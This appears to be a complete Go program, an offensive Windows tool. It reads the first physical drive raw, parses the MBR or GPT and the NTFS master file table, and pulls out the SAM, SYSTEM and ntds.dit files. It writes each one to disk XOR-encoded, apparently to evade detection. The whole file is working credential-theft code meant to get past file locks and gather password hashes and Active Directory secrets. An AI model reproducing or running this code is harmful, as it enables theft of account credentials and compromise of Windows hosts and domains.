package main

import (
        "encoding/binary"
        "fmt"
        "os"
        "strings"
        "syscall"
        "unsafe"
)

// --- Constants ---
const (
        DEFAULT_DISK_SECTOR_SIZE = 512
        STANDARD_MFT_RECORD_SIZE = 1024
        MFT_CHUNK_READ_SIZE      = 1 * 1024 * 1024
        XOR_KEY                  = "bobbert"
)

// GUID for NTFS Basic Data Partition: EBD0A0A2-B9E5-4433-87C0-68B6B72699C7
var PARTITION_BASIC_DATA_GUID = [16]byte{0xA2, 0xA0, 0xD0, 0xEB, 0xE5, 0xB9, 0x33, 0x44, 0x87, 0xC0, 0x68, 0xB6, 0xB7, 0x26, 0x99, 0xC7}

// --- Windows API wrappers ---
var (
        kernel32             = syscall.NewLazyDLL("kernel32.dll")
        procCreateFileW      = kernel32.NewProc("CreateFileW")
        procReadFile         = kernel32.NewProc("ReadFile")
        procSetFilePointerEx = kernel32.NewProc("SetFilePointerEx")
        procCloseHandle      = kernel32.NewProc("CloseHandle")
)

func openPhysicalDrive(idx int) (syscall.Handle, error) {
        path := fmt.Sprintf("\\\\.\\PhysicalDrive%d", idx)
        handle, _, err := procCreateFileW.Call(
                uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(path))),
                uintptr(syscall.GENERIC_READ),
                uintptr(syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE),
                0,
                uintptr(syscall.OPEN_EXISTING),
                uintptr(syscall.FILE_ATTRIBUTE_NORMAL),
                0,
        )
        h := syscall.Handle(handle)
        if h == syscall.InvalidHandle {
                return h, err
        }
        fmt.Printf("[+] Opened %s\n", path)
        return h, nil
}

func closeHandle(h syscall.Handle) {
        if h != syscall.InvalidHandle {
                procCloseHandle.Call(uintptr(h))
        }
}

func readAt(handle syscall.Handle, offset int64, size int) ([]byte, error) {
        var newPos int64
        ret, _, _ := procSetFilePointerEx.Call(
                uintptr(handle),
                uintptr(offset),
                uintptr(unsafe.Pointer(&newPos)),
                uintptr(0), // FILE_BEGIN
        )
        if ret == 0 {
                return nil, fmt.Errorf("SetFilePointerEx failed at offset 0x%X", offset)
        }

        buf := make([]byte, size)
        var bytesRead uint32
        ret, _, _ = procReadFile.Call(
                uintptr(handle),
                uintptr(unsafe.Pointer(&buf[0])),
                uintptr(size),
                uintptr(unsafe.Pointer(&bytesRead)),
                0,
        )
        if ret == 0 {
                return nil, fmt.Errorf("ReadFile failed at offset 0x%X", offset)
        }
        return buf[:bytesRead], nil
}

// --- XOR ---
func xorData(data []byte, key string) []byte {
        keyBytes := []byte(key)
        keyLen := len(keyBytes)
        out := make([]byte, len(data))
        for i := 0; i < len(data); i++ {
                out[i] = data[i] ^ keyBytes[i%keyLen]
        }
        return out
}

// --- NTFS structs ---
type DataRun struct {
        LCN         int64
        Clusters    int64
        PhysOffset  int64
        LengthBytes int64
}

type VBRInfo struct {
        BytesPerSector       uint16
        SectorsPerCluster    uint8
        MFTStartLCN          uint64
        ClustersPerMFTRecord int8
        PartitionOffset      int64
        AllocatedRecordSize  int
}

func parseVBR(data []byte, partOffset int64) (*VBRInfo, error) {
        oemID := string(data[3:11])
        if !strings.HasPrefix(oemID, "NTFS") {
                return nil, fmt.Errorf("Not NTFS (OEM=%s)", oemID)
        }

        bps := binary.LittleEndian.Uint16(data[11:13])
        spc := data[13]
        mftLCN := binary.LittleEndian.Uint64(data[48:56])
        clustersPerMFT := int8(data[64])

        v := &VBRInfo{
                BytesPerSector:       bps,
                SectorsPerCluster:    spc,
                MFTStartLCN:          mftLCN,
                ClustersPerMFTRecord: clustersPerMFT,
                PartitionOffset:      partOffset,
        }

        if clustersPerMFT > 0 {
                v.AllocatedRecordSize = int(clustersPerMFT) * int(bps) * int(spc)
        } else {
                v.AllocatedRecordSize = 1 << -clustersPerMFT
        }
        return v, nil
}

func decodeUTF16LE(b []byte) string {
        u16s := make([]uint16, len(b)/2)
        for i := 0; i < len(u16s); i++ {
                u16s[i] = binary.LittleEndian.Uint16(b[i*2:])
        }
        return syscall.UTF16ToString(u16s)
}

// --- Partition scanning (MBR + GPT) ---
func detectNTFSPartition(h syscall.Handle) (int64, error) {
        mbr, err := readAt(h, 0, DEFAULT_DISK_SECTOR_SIZE)
        if err != nil {
                return 0, fmt.Errorf("failed to read MBR: %v", err)
        }
        if binary.LittleEndian.Uint16(mbr[510:]) != 0xAA55 {
                return 0, fmt.Errorf("invalid MBR signature")
        }

        for i := 0; i < 4; i++ {
                entry := mbr[446+(i*16) : 446+(i*16)+16]
                partType := entry[4]
                startLBA := binary.LittleEndian.Uint32(entry[8:12])
                if partType == 0x07 && startLBA > 0 {
                        return int64(startLBA) * DEFAULT_DISK_SECTOR_SIZE, nil
                }
                if partType == 0xEE {
                        fmt.Println("[*] Found GPT Protective MBR, checking GPT...")
                        return detectGPTPartition(h)
                }
        }
        return 0, fmt.Errorf("no NTFS partition found in MBR")
}

func detectGPTPartition(h syscall.Handle) (int64, error) {
        gpt, err := readAt(h, DEFAULT_DISK_SECTOR_SIZE, DEFAULT_DISK_SECTOR_SIZE)
        if err != nil {
                return 0, fmt.Errorf("failed to read GPT header: %v", err)
        }
        if string(gpt[:8]) != "EFI PART" {
                return 0, fmt.Errorf("invalid GPT header signature")
        }

        partEntryLBA := binary.LittleEndian.Uint64(gpt[72:])
        numPartEntries := binary.LittleEndian.Uint32(gpt[80:])
        sizePartEntry := binary.LittleEndian.Uint32(gpt[84:])

        entriesSize := int(numPartEntries) * int(sizePartEntry)
        if entriesSize > 4*1024*1024 {
                entriesSize = 4 * 1024 * 1024
        }
        entries, err := readAt(h, int64(partEntryLBA)*DEFAULT_DISK_SECTOR_SIZE, entriesSize)
        if err != nil {
                return 0, fmt.Errorf("failed to read GPT entries: %v", err)
        }

        for i := 0; i < len(entries); i += int(sizePartEntry) {
                partType := entries[i : i+16]
                firstLBA := binary.LittleEndian.Uint64(entries[i+32:])
                if firstLBA == 0 {
                        continue
                }
                if string(partType) == string(PARTITION_BASIC_DATA_GUID[:]) {
                        return int64(firstLBA) * DEFAULT_DISK_SECTOR_SIZE, nil
                }
        }
        return 0, fmt.Errorf("no NTFS partition found in GPT")
}

// --- Data Runs + Record parsing ---
func parseDataRuns(attr []byte, hdrOff int, vbr *VBRInfo) ([]DataRun, int64) {
        runs := []DataRun{}
        if hdrOff+40 > len(attr) {
                return runs, 0
        }
        realSize := int64(binary.LittleEndian.Uint64(attr[hdrOff+32:]))

        if hdrOff+18 > len(attr) {
                return runs, realSize
        }
        offset := int(binary.LittleEndian.Uint16(attr[hdrOff+16:]))
        if offset == 0 || offset >= len(attr) {
                return runs, realSize
        }

        curPtr := offset
        curLCN := int64(0)
        bytesPerCluster := int64(vbr.BytesPerSector) * int64(vbr.SectorsPerCluster)

        for curPtr < len(attr) {
                hdr := attr[curPtr]
                if hdr == 0x00 {
                        break
                }
                lenSize := int(hdr & 0x0F)
                offSize := int((hdr >> 4) & 0x0F)
                curPtr++

                if curPtr+lenSize+offSize > len(attr) {
                        break
                }

                runLen := int64(0)
                for i := 0; i < lenSize; i++ {
                        runLen |= int64(attr[curPtr+i]) << (8 * i)
                }
                curPtr += lenSize

                runOff := int64(0)
                if offSize > 0 {
                        last := attr[curPtr+offSize-1]
                        for i := 0; i < offSize; i++ {
                                runOff |= int64(attr[curPtr+i]) << (8 * i)
                        }
                        if last&0x80 != 0 {
                                runOff |= ^0 << (offSize * 8)
                        }
                }
                curPtr += offSize

                curLCN += runOff
                runs = append(runs, DataRun{
                        LCN:         curLCN,
                        Clusters:    runLen,
                        PhysOffset:  vbr.PartitionOffset + curLCN*bytesPerCluster,
                        LengthBytes: runLen * bytesPerCluster,
                })
        }
        return runs, realSize
}

// Extract file content from a FILE record (with safe bounds)
func extractFileContent(h syscall.Handle, record []byte, vbr *VBRInfo) ([]byte, string, []DataRun, error) {
        if len(record) < 24 || string(record[:4]) != "FILE" {
                return nil, "", nil, fmt.Errorf("not a FILE record")
        }

        attrOffset := binary.LittleEndian.Uint16(record[20:])
        limit := len(record)
        var filename string
        var content []byte
        var runs []DataRun

        for int(attrOffset) < limit-8 {
                if int(attrOffset)+8 > len(record) {
                        break
                }
                attrType := binary.LittleEndian.Uint32(record[attrOffset:])
                attrLen := binary.LittleEndian.Uint32(record[attrOffset+4:])
                if attrType == 0xFFFFFFFF || attrLen == 0 {
                        break
                }
                if int(attrOffset)+int(attrLen) > len(record) {
                        break
                }

                nonResident := record[attrOffset+8]
                attrData := record[attrOffset : int(attrOffset)+int(attrLen)]

                // --- $FILE_NAME ---
                if attrType == 0x30 && len(attrData) >= 24 {
                        valOff := int(binary.LittleEndian.Uint16(attrData[20:]))
                        if valOff+66 <= len(attrData) {
                                if valOff+65 < len(attrData) {
                                        nameLen := int(attrData[valOff+64])
                                        end := valOff + 66 + nameLen*2
                                        if end <= len(attrData) {
                                                nameBytes := attrData[valOff+66 : end]
                                                filename = decodeUTF16LE(nameBytes)
                                        }
                                }
                        }
                }

                // --- $DATA ---
                if attrType == 0x80 && len(attrData) >= 24 {
                        if nonResident == 0 {
                                valLen := int(binary.LittleEndian.Uint32(attrData[16:]))
                                valOff := int(binary.LittleEndian.Uint16(attrData[20:]))
                                end := valOff + valLen
                                if valOff >= 0 && end <= len(attrData) {
                                        content = attrData[valOff:end]
                                }
                        } else {
                                runs, _ = parseDataRuns(attrData, 16, vbr)
                        }
                }

                attrOffset += uint16(attrLen)
        }
        return content, filename, runs, nil
}

// Stream MFT scan
func scanMFTForTargets(h syscall.Handle, vbr *VBRInfo, mftRuns []DataRun, targets []string) map[string][]byte {
        results := make(map[string][]byte)

        for _, run := range mftRuns {
                runRemaining := run.LengthBytes
                runOffset := run.PhysOffset

                for runRemaining > 0 {
                        toRead := MFT_CHUNK_READ_SIZE
                        if int64(toRead) > runRemaining {
                                toRead = int(runRemaining)
                        }

                        chunk, err := readAt(h, runOffset, toRead)
                        if err != nil {
                                fmt.Printf("[-] Error reading MFT chunk: %v\n", err)
                                return results
                        }

                        for i := 0; i+vbr.AllocatedRecordSize <= len(chunk); i += vbr.AllocatedRecordSize {
                                rec := chunk[i : i+vbr.AllocatedRecordSize]
                                content, name, runs, err := extractFileContent(h, rec, vbr)
                                if err == nil && name != "" {
                                        for _, t := range targets {
                                                if strings.EqualFold(name, t) {
                                                        if len(content) == 0 && len(runs) > 0 {
                                                                // Stream file content from runs
                                                                var fileBuf []byte
                                                                var total int64
                                                                for _, r := range runs {
                                                                        remaining := r.LengthBytes
                                                                        offset := r.PhysOffset
                                                                        for remaining > 0 && total < 50*1024*1024*1024 {
                                                                                size := 1024 * 1024
                                                                                if int64(size) > remaining {
                                                                                        size = int(remaining)
                                                                                }
                                                                                ch, _ := readAt(h, offset, size)
                                                                                fileBuf = append(fileBuf, ch...)
                                                                                offset += int64(len(ch))
                                                                                remaining -= int64(len(ch))
                                                                                total += int64(len(ch))
                                                                        }
                                                                }
                                                                content = fileBuf
                                                        }
                                                        if len(content) > 0 {
                                                                fmt.Printf("[+] Found %s (%d bytes)\n", name, len(content))
                                                                results[name] = content
                                                        }
                                                }
                                        }
                                }
                        }

                        runOffset += int64(toRead)
                        runRemaining -= int64(toRead)

                        if len(results) == len(targets) {
                                return results
                        }
                }
        }
        return results
}

// --- MAIN ---
func main() {
        h, err := openPhysicalDrive(0)
        if err != nil {
                fmt.Printf("[-] Could not open drive: %v\n", err)
                return
        }
        defer closeHandle(h)

        partOffset, err := detectNTFSPartition(h)
        if err != nil {
                fmt.Printf("[-] Partition detection failed: %v\n", err)
                return
        }
        fmt.Printf("[+] NTFS partition detected at offset 0x%X\n", partOffset)

        // Read VBR
        vbrData, err := readAt(h, partOffset, DEFAULT_DISK_SECTOR_SIZE)
        if err != nil {
                fmt.Printf("[-] Failed to read VBR: %v\n", err)
                return
        }
        vbr, err := parseVBR(vbrData, partOffset)
        if err != nil {
                fmt.Printf("[-] Parse VBR failed: %v\n", err)
                return
        }
        fmt.Printf("[+] Parsed VBR: BPS=%d, SPC=%d, MFT_LCN=0x%X, RecSize=%d\n",
                vbr.BytesPerSector, vbr.SectorsPerCluster, vbr.MFTStartLCN, vbr.AllocatedRecordSize)

        // Read $MFT record 0
        bytesPerCluster := int64(vbr.BytesPerSector) * int64(vbr.SectorsPerCluster)
        mftOffset := vbr.PartitionOffset + int64(vbr.MFTStartLCN)*bytesPerCluster
        rec0, err := readAt(h, mftOffset, vbr.AllocatedRecordSize)
        if err != nil {
                fmt.Printf("[-] Failed to read $MFT record 0: %v\n", err)
                return
        }
        _, _, mftRuns, err := extractFileContent(h, rec0, vbr)
        if err != nil || len(mftRuns) == 0 {
                fmt.Printf("[-] Failed to parse $MFT data runs\n")
                return
        }
        fmt.Printf("[+] $MFT has %d data runs\n", len(mftRuns))

        // Scan MFT for targets
        targets := []string{"SAM", "SYSTEM", "ntds.dit"}
        found := scanMFTForTargets(h, vbr, mftRuns, targets)

        // Save results
        for name, content := range found {
                out := xorData(content, XOR_KEY)
                err = os.WriteFile(strings.ToLower(name)+".xored", out, 0644)
                if err != nil {
                        fmt.Printf("[-] Failed writing %s: %v\n", name, err)
                } else {
                        fmt.Printf("[+] Wrote %s.xored\n", name)
                }
        }
}
